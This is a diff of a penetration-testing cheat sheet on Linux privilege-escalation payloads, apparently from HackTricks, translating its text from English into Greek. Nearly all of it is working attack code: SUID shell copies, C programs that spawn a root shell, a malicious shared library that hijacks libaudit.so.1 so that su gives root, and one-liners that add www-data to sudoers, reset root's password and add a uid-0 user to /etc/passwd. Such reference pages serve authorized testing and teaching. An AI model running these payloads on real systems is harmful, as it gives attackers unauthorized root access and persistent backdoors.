@@ -3,20 +3,17 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Bash
-
 ```bash
 cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
-
 ## C
-
 ```c
 //gcc payload.c -o payload
 int main(void){
-    setresuid(0, 0, 0); //Set as user suid user
-    system("/bin/sh");
-    return 0;
+setresuid(0, 0, 0); //Set as user suid user
+system("/bin/sh");
+return 0;
 }
 ```
 
@@ -27,9 +24,9 @@ int main(void){
 #include <sys/types.h>
 
 int main(){
-    setuid(getuid());
-    system("/bin/bash");
-    return 0;
+setuid(getuid());
+system("/bin/bash");
+return 0;
 }
 ```
 
@@ -40,42 +37,38 @@ int main(){
 #include <unistd.h>
 
 int main(void) {
-    char *const paramList[10] = {"/bin/bash", "-p", NULL};
-    const int id = 1000;
-    setresuid(id, id, id);
-    execve(paramList[0], paramList, NULL);
-    return 0;
+char *const paramList[10] = {"/bin/bash", "-p", NULL};
+const int id = 1000;
+setresuid(id, id, id);
+execve(paramList[0], paramList, NULL);
+return 0;
 }
 ```
+## Επικαλύπτοντας ένα αρχείο για την κλιμάκωση δικαιωμάτων
 
-## Overwriting a file to escalate privileges
+### Κοινά αρχεία
 
-### Common files
+- Προσθέστε χρήστη με κωδικό πρόσβασης στο _/etc/passwd_
+- Αλλάξτε τον κωδικό πρόσβασης μέσα στο _/etc/shadow_
+- Προσθέστε χρήστη στους sudoers στο _/etc/sudoers_
+- Καταχρήστε το docker μέσω του docker socket, συνήθως στο _/run/docker.sock_ ή _/var/run/docker.sock_
 
-- Add user with password to _/etc/passwd_
-- Change password inside _/etc/shadow_
-- Add user to sudoers in _/etc/sudoers_
-- Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_
+### Επικαλύπτοντας μια βιβλιοθήκη
 
-### Overwriting a library
-
-Check a library used by some binary, in this case `/bin/su`:
-
+Ελέγξτε μια βιβλιοθήκη που χρησιμοποιείται από κάποιο δυαδικό, σε αυτή την περίπτωση `/bin/su`:
 ```bash
 ldd /bin/su
-        linux-vdso.so.1 (0x00007ffef06e9000)
-        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
-        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
-        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
-        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
-        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
-        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
-        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
+linux-vdso.so.1 (0x00007ffef06e9000)
+libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
+libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
+libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
+libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
+libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-
-In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-So, check for functions of this library used by the **`su`** binary:
-
+Σε αυτή την περίπτωση, ας προσπαθήσουμε να προσποιηθούμε το `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Έτσι, ελέγξτε τις συναρτήσεις αυτής της βιβλιοθήκης που χρησιμοποιούνται από το **`su`** δυαδικό:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -83,9 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-
-The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.
-
+Οι συμβολισμοί `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` προέρχονται πιθανώς από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από τη κακόβουλη κοινή βιβλιοθήκη, αυτοί οι συμβολισμοί θα πρέπει να είναι παρόντες στη νέα κοινή βιβλιοθήκη, αλλιώς το πρόγραμμα δεν θα μπορεί να βρει τον συμβολισμό και θα τερματιστεί.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -102,34 +93,27 @@ void inject()__attribute__((constructor));
 
 void inject()
 {
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
+setuid(0);
+setgid(0);
+system("/bin/bash");
 }
 ```
-
-Now, just calling **`/bin/su`** you will obtain a shell as root.
+Τώρα, απλά καλώντας **`/bin/su`** θα αποκτήσετε ένα shell ως root.
 
 ## Scripts
 
-Can you make root execute something?
+Μπορείτε να κάνετε τον root να εκτελέσει κάτι;
 
-### **www-data to sudoers**
-
+### **www-data σε sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-
-### **Change root password**
-
+### **Αλλαγή κωδικού πρόσβασης root**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-
-### Add new root user to /etc/passwd
-
+### Προσθήκη νέου χρήστη root στο /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
